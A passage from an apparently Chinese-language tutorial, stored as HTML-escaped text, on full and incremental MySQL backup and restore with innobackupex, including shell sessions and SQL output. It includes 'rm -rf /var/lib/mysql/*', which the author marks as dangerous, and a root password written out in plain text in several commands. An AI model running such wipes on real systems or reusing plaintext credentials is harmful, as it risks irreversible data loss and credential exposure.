</p><p>&#x5185;&#x90E8;&#x673A;&#x5236;&#xFF1A;&#x5728;&#x5907;&#x4EFD;&#x7684;&#x65F6;&#x5019;innobackupex&#x4F1A;&#x8C03;&#x7528;xtrabackup&#x6765;&#x5907;&#x4EFD;innodb&#x8868;&#xFF0C;&#x5E76;&#x590D;&#x5236;&#x6240;&#x6709;&#x7684;&#x8868;&#x5B9A;&#x4E49;&#xFF0C;&#x5176;&#x4ED6;&#x5F15;&#x64CE;&#x7684;&#x8868;(MyISAM,MERGE,CSV,ARCHIVE)<br>innobackupex&#x662F;&#x4E00;&#x4E2A;&#x5C01;&#x88C5;&#x4E86;xtrabackup&#x7684;&#x811A;&#x672C;&#xFF0C;&#x80FD;&#x540C;&#x65F6;&#x5904;&#x7406;innodb&#x548C;myisam&#xFF0C;&#x4F46;&#x5728;&#x5904;&#x7406;myisam&#x65F6;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A;&#x8BFB;&#x9501;</p><p>&#x5176;&#x4ED6;&#x9009;&#x9879;:<br>&#x2013;no-timestamp&#xFF0C;&#x6307;&#x5B9A;&#x4E86;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x5907;&#x4EFD;&#x4F1A;&#x76F4;&#x63A5;&#x5907;&#x4EFD;&#x5728;BACKUP-DIR&#xFF0C;&#x4E0D;&#x518D;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x6233;&#x6587;&#x4EF6;&#x5939;<br>&#x2013;default-file&#xFF0C;&#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x6765;&#x914D;&#x7F6E;innobackupex&#x7684;&#x9009;&#x9879;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x6307;&#x5B9A;&#x4E86;&#x4ECE;&#x54EA;&#x4E2A;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;MySQL&#x914D;&#x7F6E;</p><p>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> &#x2013;no-timestamp /tmp/db_backup/full (&#x4F7F;&#x7528;&#x2013;no-timestamp&#x65F6;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x8FD9;&#x4E2A;full&#x76EE;&#x5F55;&#x5FC5;&#x987B;&#x8DDF;&#x4E0A;&#x4E14;&#x4E0D;&#x80FD;&#x63D0;&#x524D;&#x81EA;&#x5DF1;&#x5EFA;&#x7ACB;&#xFF0C;&#x5B83;&#x7531;innobackupex&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#xFF0C;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x62A5;&#x9519;innobackupex: Error: Failed to create backup directory) (Errcode: 17 - File exists)</p><p>[root@jaking ~]# innobackupex &#x2013;default-file=/etc/my.cnf &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> &#x2013;no-timestamp /tmp/db_backup/full<br>[root@jaking ~]# ls /tmp/db_backup/<br>full</p><p>&#x4F7F;&#x7528;innobackupex&#x8FD8;&#x539F;&#x5907;&#x4EFD;</p><p>&#x4F7F;&#x7528;innobackupex &#x2013;copy-back &#x6765;&#x8FD8;&#x539F;&#x5907;&#x4EFD;</p><p>&#x505C;&#x6B62;MySQL&#x670D;&#x52A1;</p><p>systemctl stop mysqld</p><p>&#x5220;&#x9664;&#x6570;&#x636E;&#xFF1A;&#xFF08;&#x5371;&#x9669;&#x52A8;&#x4F5C;&#xFF09;</p><pre><code class="shell">[root@jaking ~]# systemctl stop mysqld[root@jaking ~]# ls /var/lib/mysqlauto.cnf    client-cert.pem  ib_logfile0         private_key.pem  sysBOOK        client-key.pem   ib_logfile1         public_key.pem   testbookdbca-key.pem  ib_buffer_pool   mysql               server-cert.pemca.pem      ibdata1          performance_schema  server-key.pem[root@jaking ~]# rm -rf /var/lib/mysql/*[root@jaking ~]# ls /var/lib/mysql&#x8FD8;&#x539F;:[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/full/ [root@jaking ~]# ls /var/lib/mysqlBOOK            ibdata1  performance_schema  testbookdbib_buffer_pool  mysql    sys                 xtrabackup_info&#x67E5;&#x770B;&#x6743;&#x9650;[root@jaking ~]# ll /var/lib/mysqltotal 12324drwxr-x--- 2 root root       52 Apr 23 04:53 BOOK-rw-r----- 1 root root      310 Apr 23 04:53 ib_buffer_pool-rw-r----- 1 root root 12582912 Apr 23 04:53 ibdata1drwxr-x--- 2 root root     4096 Apr 23 04:53 mysqldrwxr-x--- 2 root root     8192 Apr 23 04:53 performance_schemadrwxr-x--- 2 root root     8192 Apr 23 04:53 sysdrwxr-x--- 2 root root       88 Apr 23 04:53 testbookdb-rw-r----- 1 root root      472 Apr 23 04:53 xtrabackup_info&#x91CD;&#x65B0;&#x6388;&#x6743;[root@jaking ~]# chown -Rf mysql:mysql /var/lib/mysql   #&#x8981;&#x4E0D;&#x7136;MySQL&#x670D;&#x52A1;&#x4E0D;&#x80FD;&#x542F;&#x52A8;[root@jaking ~]# ll /var/lib/mysql                   total 12324drwxr-x--- 2 mysql mysql       52 Apr 23 04:53 BOOK-rw-r----- 1 mysql mysql      310 Apr 23 04:53 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 23 04:53 ibdata1drwxr-x--- 2 mysql mysql     4096 Apr 23 04:53 mysqldrwxr-x--- 2 mysql mysql     8192 Apr 23 04:53 performance_schemadrwxr-x--- 2 mysql mysql     8192 Apr 23 04:53 sysdrwxr-x--- 2 mysql mysql       88 Apr 23 04:53 testbookdb-rw-r----- 1 mysql mysql      472 Apr 23 04:53 xtrabackup_info[root@jaking ~]# systemctl start mysqld&#x6CE8;&#xFF1A;datadir&#x5FC5;&#x987B;&#x662F;&#x4E3A;&#x7A7A;&#x7684;&#xFF0C;innobackupex &#x2013;copy-back&#x4E0D;&#x4F1A;&#x8986;&#x76D6;&#x5DF2;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD8;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x8FD8;&#x539F;&#x65F6;&#x9700;&#x8981;&#x5148;&#x5173;&#x95ED;&#x670D;&#x52A1;&#xFF0C;&#x5982;&#x679C;&#x670D;&#x52A1;&#x662F;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x80FD;&#x8FD8;&#x539F;&#x5230;datadir[root@jaking ~]# ls /var/lib/mysqlauto.cnf  mysql  performance_schema  sys[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/full/xtrabackup: recognized server arguments: --datadir=/var/lib/mysql xtrabackup: recognized client arguments: 220423 05:01:30 innobackupex: Starting the copy-back operationIMPORTANT: Please check that the copy-back run completes successfully.           At the end of a successful copy-back run innobackupex           prints &quot;completed OK!&quot;.innobackupex version 2.4.22 based on MySQL server 5.7.32 Linux (x86_64) (revision id: c99a781)Original data directory /var/lib/mysql is not empty![root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.20 MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || mysql              || performance_schema || sys                || testbookdb         |+--------------------+6 rows in set (0.00 sec)mysql&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book           |+----------------+1 row in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; use testbookdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------------+| Tables_in_testbookdb |+----------------------+| book1                || book2                |+----------------------+2 rows in set (0.00 sec)mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName                             | price | publishing            |+---------+-----------------------------------+-------+-----------------------+|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        ||       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name                              | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; </code></pre><p>5&#xFF1A;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E0E;&#x8FD8;&#x539F;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4F5C;&#x7528;&#xFF1A;&#x51CF;&#x5C11;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x91CD;&#x590D;&#xFF0C;&#x8282;&#x7701;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#xFF0C;&#x7F29;&#x77ED;&#x5907;&#x4EFD;&#x65F6;&#x95F4;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4F9D;&#x8D56;&#x4E8E;innodb&#x9875;&#x4E0A;&#x9762;&#x7684;LSN&#xFF08;log sequence number&#xFF09;&#xFF0C;&#x6BCF;&#x6B21;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FEE;&#x6539;&#x90FD;&#x4F1A;&#x5BFC;&#x81F4;LSN&#x81EA;&#x589E;&#xFF0C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4F1A;&#x590D;&#x5236;&#x6307;&#x5B9A;LSN&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;&#x4E4B;&#x540E;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x9875;</p><p>&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;</p><ol><li>&#x9996;&#x5148;&#x521B;&#x5EFA;&#x5168;&#x5907;<br>&#x5728;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5168;&#x5907;&#xFF0C;&#x4E0D;&#x7136;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x662F;&#x6CA1;&#x6709;&#x610F;&#x4E49;&#x7684;<pre><code class="shell">innobackupex --user=root --password=Jaking@vip.163.com /tmp/db_backup/[root@jaking ~]# ls /tmpdb_backup  percona-version-check[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58</code></pre>&#x63D2;&#x5165;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x5230;&#x8868;&#x91CC;&#x9762;<br><code>`</code>shell<br>[root@jaking ~]# mysql -uroot <a href="mailto:-pJaking@vip.163.com" target="_blank" rel="noopener">-pJaking@vip.163.com</a><br>mysql: [Warning] Using a password on the command line interface can be insecure.<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 7<br>Server version: 5.7.20 MySQL Community Server (GPL)</li></ol><p>Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</p><p>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.</p><p>Type &#x2018;help;&#x2019; or &#x2018;\h&#x2019; for help. Type &#x2018;\c&#x2019; to clear the current input statement.</p><pre><code>```sqlmysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || mysql              || performance_schema || sys                || testbookdb         |+--------------------+6 rows in set (0.00 sec)CREATE DATABASE TESTDB;show databases;use TESTDB;CREATE TABLE TABLE1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;SYS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;MySQL4&apos;,&apos;74&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;MySQL5&apos;,&apos;75&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;MySQL6&apos;,&apos;76&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;MySQL7&apos;,&apos;77&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;MySQL8&apos;,&apos;78&apos;,&apos;QH&apos;);INSERT INTO TABLE1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;MySQL9&apos;,&apos;79&apos;,&apos;QH&apos;);CREATE TABLE TABLE2 (name char(16),price int,pages int);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;Linux&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;CLD&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;SYS&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO TABLE2(name,price,pages) VALUES(&apos;MySQL1&apos;,&apos;166&apos;,&apos;666&apos;);show tables;select * from TABLE1;select * from TABLE2;mysql&gt; show tables;+------------------+| Tables_in_TESTDB |+------------------+| TABLE1           || TABLE2           |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from TABLE1;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         ||       7 | MySQL4 |    74 | QH         ||       8 | MySQL5 |    75 | QH         ||       9 | MySQL6 |    76 | QH         ||      10 | MySQL7 |    77 | QH         ||      11 | MySQL8 |    78 | QH         ||      12 | MySQL9 |    79 | QH         |+---------+--------+-------+------------+12 rows in set (0.00 sec)mysql&gt; select * from TABLE2;+--------+-------+-------+| name   | price | pages |+--------+-------+-------+| Linux  |    30 |   666 || CLD    |    60 |   666 || SYS    |    80 |   666 || MySQL1 |   166 |   666 |+--------+-------+-------+4 rows in set (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || TESTDB             || mysql              || performance_schema || sys                || testbookdb         |+--------------------+7 rows in set (0.00 sec)4 rows in set (0.00 sec)</code></pre><ol start="2"><li>&#x4F7F;&#x7528; &#x2013;incremental&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;<pre><code class="shell">innobackupex --user=root --password=Jaking@vip.163.com --incremental /&#x589E;&#x91CF;1&#x8DEF;&#x5F84; --incremental-basedir=&#x5168;&#x5907;&#x8DEF;&#x5F84;&#xFF0C;&#x6307;&#x5B9A;&#x5728;&#x54EA;&#x4E2A;&#x5168;&#x5907;&#x4E0A;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;[root@jaking ~]# ls /tmp/db_backup/2021-05-14_08-33-57[root@jaking ~]# innobackupex --user=root --password=Jaking@vip.163.com --incremental /tmp/db_backup/ --incremental-basedir=/tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58  2022-04-24_21-31-38[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58/backup-my.cnf   mysql               xtrabackup_checkpointsBOOK            performance_schema  xtrabackup_infoib_buffer_pool  sys                 xtrabackup_logfileibdata1         testbookdb[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-31-38/backup-my.cnf   mysql               xtrabackup_checkpointsBOOK            performance_schema  xtrabackup_infoib_buffer_pool  sys                 xtrabackup_logfileibdata1.delta   testbookdbibdata1.meta    TESTDB[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-23-58/26M     /tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-31-38/ 5.1M    /tmp/db_backup/2022-04-24_21-31-38/</code></pre>&#x518D;&#x67E5;&#x770B;LSN&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;<br>[root@jaking ~]# cat /tmp/db_backup/2022-04-24_21-23-58/xtrabackup_checkpoints<br>backup_type = full-backuped<br>from_lsn = 0<br>to_lsn = 2566100<br>last_lsn = 2566109<br>compact = 0<br>recover_binlog_info = 0<br>flushed_lsn = 2566109</li></ol><p>[root@jaking ~]# cat /tmp/db_backup/2022-04-24_21-31-38/xtrabackup_checkpoints<br>backup_type = incremental<br>from_lsn = 2566100<br>to_lsn = 2588592<br>last_lsn = 2588601<br>compact = 0<br>recover_binlog_info = 0<br>flushed_lsn = 2588601</p><ol start="3"><li>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x521B;&#x5EFA;&#x7684;&#x66FF;&#x4EE3;&#x65B9;&#x6CD5;<br>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6307;&#x5B9A; &#x2013;incremental-lsn&#x6765;&#x4EE3; &#x2013;incremental-basedir&#x7684;&#x65B9;&#x6CD5;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;<br>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> &#x2013;incremental /tmp/db_backup/ &#x2013;incremental-lsn=&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;  #&#x4ECE;&#x8FD9;&#x4E2A;&#x7F16;&#x53F7;&#x70B9;&#x5F00;&#x59CB;&#x5907;&#x4EFD;<pre><code class="shell">[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58  2022-04-24_21-31-38[root@jaking ~]# innobackupex --user=root --password=Jaking@vip.163.com --incremental /tmp/db_backup/ --incremental-lsn=2566109[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58  2022-04-24_21-31-38  2022-04-24_21-41-49[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-23-5826M     /tmp/db_backup/2022-04-24_21-23-58[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-31-385.1M    /tmp/db_backup/2022-04-24_21-31-38[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-41-495.1M    /tmp/db_backup/2022-04-24_21-41-49</code></pre>&#x6CE8;&#x610F;&#xFF1A;xtrabackup&#x53EA;&#x4F1A;&#x5F71;&#x54CD;xtradb&#x6216;&#x8005;innodb&#x7684;&#x8868;&#xFF0C;&#x5176;&#x4ED6;&#x5F15;&#x64CE;&#x7684;&#x8868;&#x5728;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x65F6;&#x5019;&#x53EA;&#x4F1A;&#x590D;&#x5236;&#x6574;&#x4E2A;&#x6587;&#x4EF6;</li></ol><p>&#x8FD8;&#x539F;</p><p>&#x505C;&#x6B62;MySQL&#x670D;&#x52A1;,&#x5220;&#x9664;&#x6570;&#x636E; rm -rf /var/lib/mysql/* </p><p>&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x5907;&#x4EFD;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x6062;&#x590D;&#x6BD4;&#x5168;&#x5907;&#x8981;&#x590D;&#x6742;&#x4E00;&#x70B9;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#x662F;&#x5728;&#x6240;&#x6709;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E0B;&#x91CD;&#x505A;&#x5DF2;&#x63D0;&#x4EA4;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x5982;&#xFF1A;<br>innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR  </p><p>innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-1<br>innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-2<br>&#x2026;<br>&#x2026;<br>&#x2026;<br>innobackupex &#x2013;apply-log BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-last-num</p><p>&#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x4EC5;&#x6709;&#x4E00;&#x4EFD;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;&#x7B2C;3&#x6761;&#x8BED;&#x53E5;&#x5FFD;&#x7565;<br>&#x5176;&#x4E2D;BASE-DIR&#x662F;&#x6307;&#x5168;&#x5907;&#x76EE;&#x5F55;&#xFF0C;INCREMENTAL-DIR-1&#x662F;&#x6307;&#x7B2C;&#x4E00;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;INCREMENTAL-DIR-2&#x662F;&#x6307;&#x7B2C;&#x4E8C;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5E76;&#x6CA1;&#x6709;&#x2013;redo-only&#x9009;&#x9879;&#xFF01;</p><p>&#x4EE5;&#x4E0A;&#x8BED;&#x53E5;&#x6267;&#x884C;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x5728;BASE-DIR&#xFF08;&#x5373;&#x5168;&#x5907;&#x76EE;&#x5F55;&#xFF09;&#x4E0B;</p><p>&#x7B2C;&#x4E00;&#x6B65;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x7B2C;&#x4E8C;&#x6B65;&#xFF1A;&#x56DE;&#x6EDA;&#x672A;&#x5B8C;&#x6210;&#x7684;&#x65E5;&#x5FD7;&#xFF1A;<br>innobackupex &#x2013;apply-log BASE-DIR</p><p>&#x4E0A;&#x9762;&#x6267;&#x884C;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;BASE-DIR&#x91CC;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5DF2;&#x5B8C;&#x5168;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x662F;&#x62F7;&#x8D1D;&#xFF1A;<br>innobackupex &#x2013;copy-back BASE-DIR</p><p>&#x6062;&#x590D;mysql&#x6743;&#x9650; chown -Rf mysql:mysql /var/lib/mysql/</p><p>&#x6700;&#x540E;&#x542F;&#x52A8; systemctl start mysqld </p><p>&#x68C0;&#x9A8C;&#x6570;&#x636E;&#x662F;&#x5426;&#x6062;&#x590D;&#x6B63;&#x5E38;<br>&#x6CE8;&#x610F;&#xFF1A;innobackupex&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5BB9;&#x6613;&#x51FA;&#x9519;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#xFF01;</p><p>&#x5B9E;&#x6218;&#xFF1A;</p><pre><code class="shell">[root@jaking ~]# ls /var/lib/mysqlauto.cnf        ibdata1      mysql               testbookdbBOOK            ib_logfile0  performance_schema  TESTDBib_buffer_pool  ib_logfile1  sys                 xtrabackup_info[root@jaking ~]# mkdir /mysql-all-data[root@jaking ~]# mv /var/lib/mysql/* /mysql-all-data/[root@jaking ~]# ls /var/lib/mysql                   [root@jaking ~]# ls /mysql-all-data/auto.cnf        ibdata1      mysql               testbookdbBOOK            ib_logfile0  performance_schema  TESTDBib_buffer_pool  ib_logfile1  sys                 xtrabackup_info[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58  2022-04-24_21-31-38  2022-04-24_21-41-49[root@jaking ~]# rm -rf /tmp/db_backup/2022-04-24_21-41-49[root@jaking ~]# ls /tmp/db_backup/                       2022-04-24_21-23-58  2022-04-24_21-31-38[root@jaking ~]# innobackupex --apply-log --redo-only /tmp/db_backup/2022-04-24_21-23-58[root@jaking ~]# innobackupex --apply-log /tmp/db_backup/2022-04-24_21-23-58 --incremental-dir=/tmp/db_backup/2022-04-24_21-31-38fnaich:&#xFF01;&#x589E;&#x91CF;&#x5408;&#x5E76;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x5426;&#x5219;&#x62A5;&#x9519;[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58/backup-my.cnf   ib_logfile0  performance_schema  xtrabackup_checkpointsBOOK            ib_logfile1  sys                 xtrabackup_infoib_buffer_pool  ibtmp1       testbookdb          xtrabackup_logfileibdata1         mysql        TESTDB              xtrabackup_master_key_id[root@jaking ~]# innobackupex --apply-log /tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/2022-04-24_21-23-58/[root@jaking ~]# chown -Rf mysql:mysql /var/lib/mysql/[root@jaking ~]# ll /var/lib/mysql/total 122920drwxr-x--- 2 mysql mysql       88 Apr 24 21:59 BOOK-rw-r----- 1 mysql mysql      315 Apr 24 21:59 ib_buffer_pool-rw-r----- 1 mysql mysql 12582912 Apr 24 